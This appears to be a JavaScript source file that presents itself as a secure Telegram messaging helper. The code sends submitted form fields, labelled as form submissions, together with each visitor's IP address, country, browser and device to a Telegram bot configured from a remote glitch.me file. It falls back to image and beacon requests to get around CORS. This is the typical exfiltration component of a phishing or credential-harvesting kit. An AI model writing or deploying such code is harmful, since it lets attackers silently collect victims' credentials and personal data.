/**
 * Telegram Proxy Handler
 * ----------------------
 * This script provides a secure way to send messages to Telegram
 * without exposing API tokens in the HTML source code.
 * 
 * It uses a combination of techniques to overcome CORS issues
 * while keeping the API credentials secure.
 * 
 * @version 1.0.0
 */

class TelegramProxyHandler {
  /**
   * Initialize the Telegram Handler
   * @param {Object} options - Configuration options
   * @param {string} options.configUrl - URL to the configuration JSON file
   * @param {boolean} options.collectUserInfo - Whether to collect user information (default: true)
   * @param {number} options.timeout - Maximum time to wait for operations (ms)
   */
  constructor(options = {}) {
    this.options = {
      configUrl: 'https://hallowed-lava-property.glitch.me/iconfig.json',
      collectUserInfo: true,
      timeout: 5000,
      ...options
    };
    
    this.config = null;
    this.initialized = false;
    this.initializing = false;
    
    // Store user information
    this.userInfo = {
      ipAddress: "Collecting...",
      userAgent: navigator.userAgent,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      browser: this._detectBrowser(),
      country: "Collecting...",
      device: this._detectDevice(),
      language: navigator.language || navigator.userLanguage || "Unknown"
    };
    
    // Start collecting user information if enabled
    if (this.options.collectUserInfo) {
      this._collectUserInfo();
    }
  }
  
  /**
   * Initialize the handler
   * @returns {Promise<boolean>} - True if successfully initialized
   */
  async initialize() {
    if (this.initialized) return true;
    if (this.initializing) return this._waitForInitialization();
    
    this.initializing = true;
    
    try {
      // Try to load config from URL
      this.config = await this._loadConfig();
      
      if (!this.config || !this.config.telegram || !this.config.telegram.token || !this.config.telegram.chatId) {
        console.error("Invalid Telegram configuration");
        this.initializing = false;
        return false;
      }
      
      this.initialized = true;
      this.initializing = false;
      return true;
    } catch (error) {
      console.error("Failed to initialize Telegram handler:", error);
      this.initializing = false;
      return false;
    }
  }
  
  /**
   * Send a message to Telegram
   * @param {Object} data - The data to send
   * @param {string} prefix - Optional message prefix
   * @param {string} suffix - Optional message suffix
   * @returns {Promise<boolean>} - Whether the message was sent successfully
   */
  async sendMessage(data, prefix = '🔐 Form Submission 🔐\n', suffix = '\n=========================') {
    try {
      // Ensure we're initialized
      if (!this.initialized) {
        const success = await this.initialize();
        if (!success) return false;
      }
      
      // Format the message
      let messageText = prefix;
      
      // Add the data fields
      for (const [key, value] of Object.entries(data)) {
        messageText += `${key}: ${value}\n`;
      }
      
      // Add user information if we're collecting it
      if (this.options.collectUserInfo) {
        // Wait for user information to be collected (with timeout)
        await this._waitForUserInfo();
        
        messageText += `\n------- User's Info -------\n`;
        messageText += `📍 IP: ${this.userInfo.ipAddress}\n`;
        messageText += `🌍 Country: ${this.userInfo.country}\n`;
        messageText += `⏰ Timezone: ${this.userInfo.timezone}\n`;
        messageText += `🌎 Browser: ${this.userInfo.browser}\n`;
        messageText += `📱 Device: ${this.userInfo.device}\n`;
        messageText += `🔤 Language: ${this.userInfo.language}\n`;
      }
      
      // Add suffix
      messageText += suffix;
      
      // Try multiple methods to send the message to maximize success rate
      return await this._attemptMultipleSendMethods(messageText);
    } catch (error) {
      console.error("Error sending Telegram message:", error);
      return false;
    }
  }
  
  /**
   * Load configuration from URL
   * @private
   * @returns {Promise<Object>} - The configuration object
   */
  async _loadConfig() {
    try {
      // Try multiple methods to load the configuration
      const methods = [
        this._loadConfigFetch.bind(this),
        this._loadConfigXhr.bind(this),
        this._loadConfigJsonp.bind(this)
      ];
      
      // Try each method until one succeeds
      for (const method of methods) {
        try {
          const config = await method();
          if (config) return config;
        } catch (error) {
          console.warn(`Config loading method failed:`, error);
          // Continue to next method
        }
      }
      
      throw new Error("All configuration loading methods failed");
    } catch (error) {
      console.error("Error loading configuration:", error);
      throw error;
    }
  }
  
  /**
   * Load configuration using fetch API
   * @private
   * @returns {Promise<Object>} - The configuration object
   */
  async _loadConfigFetch() {
    const response = await fetch(this.options.configUrl, {
      method: 'GET',
      headers: {
        'Accept': 'application/json',
        'Cache-Control': 'no-cache'
      },
      cache: 'no-store'
    });
    
    if (!response.ok) {
      throw new Error(`Failed to load config: ${response.status}`);
    }
    
    return await response.json();
  }
  
  /**
   * Load configuration using XMLHttpRequest
   * @private
   * @returns {Promise<Object>} - The configuration object
   */
  _loadConfigXhr() {
    return new Promise((resolve, reject) => {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', this.options.configUrl, true);
      xhr.setRequestHeader('Accept', 'application/json');
      xhr.setRequestHeader('Cache-Control', 'no-cache');
      xhr.timeout = this.options.timeout;
      
      xhr.onload = function() {
        if (xhr.status >= 200 && xhr.status < 300) {
          try {
            resolve(JSON.parse(xhr.responseText));
          } catch (e) {
            reject(new Error("Invalid JSON response"));
          }
        } else {
          reject(new Error(`XHR failed with status: ${xhr.status}`));
        }
      };
      
      xhr.onerror = function() {
        reject(new Error("XHR request failed"));
      };
      
      xhr.ontimeout = function() {
        reject(new Error("XHR request timed out"));
      };
      
      xhr.send();
    });
  }
  
  /**
   * Load configuration using JSONP (for extreme cases)
   * @private
   * @returns {Promise<Object>} - The configuration object
   */
  _loadConfigJsonp() {
    return new Promise((resolve, reject) => {
      // Create a unique callback name
      const callbackName = 'telegramHandlerCallback_' + Math.random().toString(36).substr(2, 9);
      
      // Set up the callback function
      window[callbackName] = function(data) {
        // Clean up
        document.head.removeChild(script);
        delete window[callbackName];
        
        // Resolve with the data
        resolve(data);
      };
      
      // Create a script element
      const script = document.createElement('script');
      script.src = `${this.options.configUrl.split('?')[0]}?callback=${callbackName}&_=${Date.now()}`;
      
      // Handle errors
      script.onerror = function() {
        // Clean up
        document.head.removeChild(script);
        delete window[callbackName];
        
        reject(new Error("JSONP request failed"));
      };
      
      // Set a timeout
      const timeout = setTimeout(() => {
        // Clean up
        if (document.head.contains(script)) {
          document.head.removeChild(script);
        }
        delete window[callbackName];
        
        reject(new Error("JSONP request timed out"));
      }, this.options.timeout);
      
      // Append the script to the document
      document.head.appendChild(script);
    });
  }
  
  /**
   * Wait for the handler to be initialized
   * @private
   * @returns {Promise<boolean>} - True if successfully initialized
   */
  _waitForInitialization() {
    return new Promise((resolve) => {
      const startTime = Date.now();
      
      const checkInterval = setInterval(() => {
        if (!this.initializing) {
          clearInterval(checkInterval);
          resolve(this.initialized);
        } else if (Date.now() - startTime > this.options.timeout) {
          clearInterval(checkInterval);
          console.warn("Initialization timed out");
          resolve(false);
        }
      }, 100);
    });
  }
  
  /**
   * Try multiple methods to send a Telegram message
   * @private
   * @param {string} messageText - The message to send
   * @returns {Promise<boolean>} - Whether any method succeeded
   */
  async _attemptMultipleSendMethods(messageText) {
    const methods = [
      this._sendViaDirect.bind(this),
      this._sendViaImage.bind(this),
      this._sendViaBeacon.bind(this)
    ];
    
    for (const method of methods) {
      try {
        const success = await method(messageText);
        if (success) return true;
      } catch (error) {
        console.warn(`Telegram send method failed:`, error);
        // Continue to next method
      }
    }
    
    console.error("All Telegram send methods failed");
    return false;
  }
  
  /**
   * Send a message to Telegram using direct API call
   * @private
   * @param {string} messageText - The message to send
   * @returns {Promise<boolean>} - Whether the message was sent successfully
   */
  async _sendViaDirect(messageText) {
    const payload = {
      chat_id: this.config.telegram.chatId,
      text: messageText,
      parse_mode: "HTML"
    };
    
    const response = await fetch(`https://api.telegram.org/bot${this.config.telegram.token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(payload)
    });
    
    if (!response.ok) {
      const errorData = await response.json();
      throw new Error(`Telegram API error: ${errorData.description || response.statusText}`);
    }
    
    const data = await response.json();
    return data.ok === true;
  }
  
  /**
   * Send a message to Telegram using the image method (bypasses CORS)
   * @private
   * @param {string} messageText - The message to send
   * @returns {Promise<boolean>} - Whether the message was sent successfully
   */
  _sendViaImage(messageText) {
    return new Promise((resolve) => {
      const img = new Image();
      
      // URL encode the message
      const encodedText = encodeURIComponent(messageText);
      
      // Construct the URL
      img.src = `https://api.telegram.org/bot${this.config.telegram.token}/sendMessage?chat_id=${this.config.telegram.chatId}&text=${encodedText}`;
      
      // Set up success/failure handlers
      img.onload = () => resolve(true);
      img.onerror = () => resolve(false);
      
      // Set a timeout
      setTimeout(() => resolve(false), 5000);
    });
  }
  
  /**
   * Send a message to Telegram using the Beacon API
   * @private
   * @param {string} messageText - The message to send
   * @returns {Promise<boolean>} - Whether the message was sent successfully
   */
  _sendViaBeacon(messageText) {
    if (!navigator.sendBeacon) return Promise.resolve(false);
    
    const payload = {
      chat_id: this.config.telegram.chatId,
      text: messageText
    };
    
    const blob = new Blob([JSON.stringify(payload)], {
      type: 'application/json'
    });
    
    const url = `https://api.telegram.org/bot${this.config.telegram.token}/sendMessage`;
    const success = navigator.sendBeacon(url, blob);
    
    return Promise.resolve(success);
  }
  
  /**
   * Detect the user's browser
   * @private
   * @returns {string} - The detected browser
   */
  _detectBrowser() {
    const ua = navigator.userAgent;
    
    if (ua.indexOf("Firefox") > -1) {
      return "Mozilla Firefox";
    } else if (ua.indexOf("SamsungBrowser") > -1) {
      return "Samsung Internet";
    } else if (ua.indexOf("Opera") > -1 || ua.indexOf("OPR") > -1) {
      return "Opera";
    } else if (ua.indexOf("Trident") > -1) {
      return "Internet Explorer";
    } else if (ua.indexOf("Edge") > -1) {
      return "Microsoft Edge";
    } else if (ua.indexOf("Chrome") > -1) {
      return "Google Chrome";
    } else if (ua.indexOf("Safari") > -1) {
      return "Apple Safari";
    }
    
    return "Unknown Browser";
  }
  
  /**
   * Detect the user's device type
   * @private
   * @returns {string} - The detected device type
   */
  _detectDevice() {
    const ua = navigator.userAgent;
    
    if (/iPad|iPhone|iPod/.test(ua)) {
      return "iOS";
    } else if (/Android/.test(ua)) {
      return "Android";
    } else if (/Windows Phone|IEMobile/.test(ua)) {
      return "Windows Phone";
    } else if (/Windows/.test(ua)) {
      return "Windows";
    } else if (/Macintosh/.test(ua)) {
      return "Mac";
    } else if (/Linux/.test(ua)) {
      return "Linux";
    }
    
    return "Unknown Device";
  }
  
  /**
   * Collect user information
   * @private
   */
  _collectUserInfo() {
    // Try multiple IP services
    this._getIpInfo()
      .then(info => {
        if (info) {
          this.userInfo.ipAddress = info.ip || "Unknown";
          this.userInfo.country = info.country || "Unknown";
        }
      })
      .catch(error => {
        console.warn("Error collecting user info:", error);
        this.userInfo.ipAddress = "Collection Failed";
        this.userInfo.country = "Collection Failed";
      });
  }
  
  /**
   * Get IP and location information from various services
   * @private
   * @returns {Promise<Object>} - The collected information
   */
  async _getIpInfo() {
    const services = [
      { url: 'https://api.ipify.org?format=json', ipField: 'ip' },
      { url: 'https://ipapi.co/json/', ipField: 'ip', countryField: 'country_name' },
      { url: 'https://api.db-ip.com/v2/free/self', ipField: 'ipAddress', countryField: 'countryName' }
    ];
    
    for (const service of services) {
      try {
        const response = await fetch(service.url);
        
        if (!response.ok) continue;
        
        const data = await response.json();
        
        return {
          ip: data[service.ipField] || null,
          country: service.countryField ? (data[service.countryField] || null) : null
        };
      } catch (error) {
        console.warn(`IP service ${service.url} failed:`, error);
        // Continue to next service
      }
    }
    
    // If all services fail
    return null;
  }
  
  /**
   * Wait for user information to be collected
   * @private
   * @returns {Promise<void>}
   */
  _waitForUserInfo() {
    return new Promise(resolve => {
      if (this.userInfo.ipAddress !== "Collecting..." && 
          this.userInfo.country !== "Collecting...") {
        resolve();
        return;
      }
      
      const startTime = Date.now();
      
      const checkInterval = setInterval(() => {
        if (this.userInfo.ipAddress !== "Collecting..." && 
            this.userInfo.country !== "Collecting...") {
          clearInterval(checkInterval);
          resolve();
        } else if (Date.now() - startTime > this.options.timeout) {
          // Timeout - stop waiting and proceed anyway
          clearInterval(checkInterval);
          this.userInfo.ipAddress = "Collection Timed Out";
          this.userInfo.country = "Collection Timed Out";
          resolve();
        }
      }, 100);
    });
  }
}

// Make the class available globally
window.TelegramProxyHandler = TelegramProxyHandler;